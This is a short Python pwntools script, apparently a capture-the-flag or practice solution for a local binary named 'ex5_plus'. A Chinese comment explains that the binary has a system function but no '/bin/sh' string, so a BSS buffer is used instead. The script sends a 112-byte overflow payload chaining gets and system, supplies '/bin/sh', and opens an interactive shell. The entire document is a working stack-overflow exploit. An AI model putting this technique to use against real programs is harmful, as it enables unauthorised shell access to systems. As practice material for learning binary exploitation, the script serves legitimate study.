from pwn import *

"""
经IDA Pro搜索，有system函数，但无/bin/sh；
在BSS段找到一个全局变量buf地址是0804A080，可以用它配合gets函数让程序读取/bin/sh
"""

buf_addr = 0x0804A080
sys_addr = 0x08048490
gets_addr = 0x08048460

payload = b"A" * 112 + p32(gets_addr) + p32(sys_addr) + p32(buf_addr) + p32(buf_addr)

p = process("./ex5_plus")
p.recvuntil("think ?")
p.send(payload)
p.sendline(b"/bin/sh")
p.interactive()
